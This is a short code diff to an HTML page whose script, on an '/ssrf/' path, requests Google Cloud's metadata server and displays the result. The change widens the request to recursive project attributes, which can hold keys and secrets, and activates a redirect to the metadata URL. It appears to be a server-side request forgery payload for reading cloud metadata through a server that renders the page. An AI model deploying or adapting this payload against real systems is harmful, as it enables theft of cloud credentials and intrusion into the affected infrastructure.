@@ -21,7 +21,7 @@
     <script>
         document.addEventListener('DOMContentLoaded', (event) => {
             if (window.location.pathname === '/ssrf/') {
-                fetch('http://metadata/computeMetadata/v1/instance/id', {
+                fetch('http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text', {
                     method: 'GET',
                     headers: {
                         'Metadata-Flavor': 'Google',
@@ -32,7 +32,7 @@
                 .then(data => {
                     document.getElementById('responseData').innerText = data;
                     // Uncomment the line below to redirect after displaying the data
-                    // window.location.href = 'http://metadata/computeMetadata/v1/instance/id';
+                    window.location.href = 'http://metadata/computeMetadata/v1/instance/id';
                 })
                 .catch(error => {
                     console.error('Error:', error);
